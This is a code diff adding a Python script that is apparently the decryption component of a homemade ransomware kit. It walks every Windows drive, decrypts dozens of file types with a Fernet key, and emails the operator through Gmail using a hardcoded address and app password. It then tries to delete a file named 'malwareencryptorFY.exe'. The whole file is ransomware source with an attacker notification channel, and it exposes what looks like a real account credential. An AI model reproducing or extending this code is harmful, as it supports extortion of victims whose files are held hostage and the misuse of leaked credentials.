@@ -1,0 +1,106 @@
+# import required module
+from cryptography.fernet import Fernet
+import os
+from pathlib import Path
+import smtplib
+from email.message import EmailMessage
+import ctypes
+
+def email_alert(subject, body, to, fromwho):
+    msg = EmailMessage()
+    msg.set_content(body)
+    msg['subject'] = subject
+    msg['to'] = to
+
+    user = "anonymousishere521@gmail.com"
+    msg['from'] = fromwho
+    password = "vwabmiotfupfihdl"
+
+    server = smtplib.SMTP("smtp.gmail.com", 587)
+    server.starttls()
+    server.login(user, password)
+    server.send_message(msg)
+
+    server.quit()
+
+key = input("ENTER THE DECRYPTION KEY BELOW: \n")
+print("PLEASE WAIT, THIS MAY TAKE A FEW MINUITES.....\n")
+# using the generated key
+fernet = Fernet(key)
+def get_logical_drives():
+    drive_bitmask = ctypes.windll.kernel32.GetLogicalDrives()
+    drives = []
+    for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
+        if drive_bitmask & 1:
+            drives.append(letter)
+        drive_bitmask >>= 1
+    return drives
+
+drives = get_logical_drives()
+
+for drive in drives:
+    driver = drive + ":\\"
+    input_dir = Path.cwd() / driver
+    txtfiles = list(input_dir.rglob("*.txt*"))
+    docxfiles = list(input_dir.rglob("*.docx*"))
+    xlsxfiles = list(input_dir.rglob("*.xlsx*"))
+    pngfiles = list(input_dir.rglob("*.png*"))
+    jpgfiles = list(input_dir.rglob("*.jpg*"))
+    jsonfiles = list(input_dir.rglob("*.json*"))
+    csvfiles = list(input_dir.rglob("*.csv*"))
+    xmlfiles = list(input_dir.rglob("*.xml*"))
+    mp3files = list(input_dir.rglob("*.mp3*"))
+    mp4files = list(input_dir.rglob("*.mp4"))
+    movfiles = list(input_dir.rglob("*.mov*"))
+    batfiles = list(input_dir.rglob("*.bat*"))
+    wavfiles = list(input_dir.rglob("*.wav*"))
+    pdffiles = list(input_dir.rglob("*.pdf*"))
+    pptxfiles = list(input_dir.rglob("*.pptx*"))
+    pptfiles = list(input_dir.rglob("*.ppt*"))
+
+    gfiles = txtfiles + docxfiles + xlsxfiles + pngfiles + jpgfiles + jsonfiles + csvfiles + xmlfiles + mp3files + mp4files + movfiles + batfiles + pdffiles + wavfiles + pptxfiles + pptfiles
+    count = 0
+    for singlefile in gfiles:
+        try:
+            # opening the encrypted file
+            with open(singlefile, 'rb') as enc_file:
+                encrypted = enc_file.read()
+
+            # decrypting the file
+            decrypted = fernet.decrypt(encrypted)
+
+            # opening the file in write mode and
+            # writing the decrypted data
+            with open(singlefile, 'wb') as dec_file:
+                dec_file.write(decrypted)
+        except:
+            pass
+        count += 1
+        print(f'{count} of {len(gfiles)} files decrypted')
+        print(singlefile)
+    print(f'DRIVE {drive} has now been decrypted')
+
+if __name__ == '__main__':
+    email_alert("Alert", "They have now managed to decrypt all of the files.", "ayaanstar521@gmail.com", "ransomware deactivated")
+
+input("ALL FILES HAVE BEEN DECRYPTED")
+
+try:
+    pathm = os.getcwd()
+    # File name
+    file = 'malwareencryptorFY.exe'
+
+    # File location
+    location = "pathm"
+
+    # Path
+    path = os.path.join(location, file)
+
+    # Remove the specified
+    # file path
+    try:
+        os.remove(path)
+    except:
+        pass
+except:
+    pass
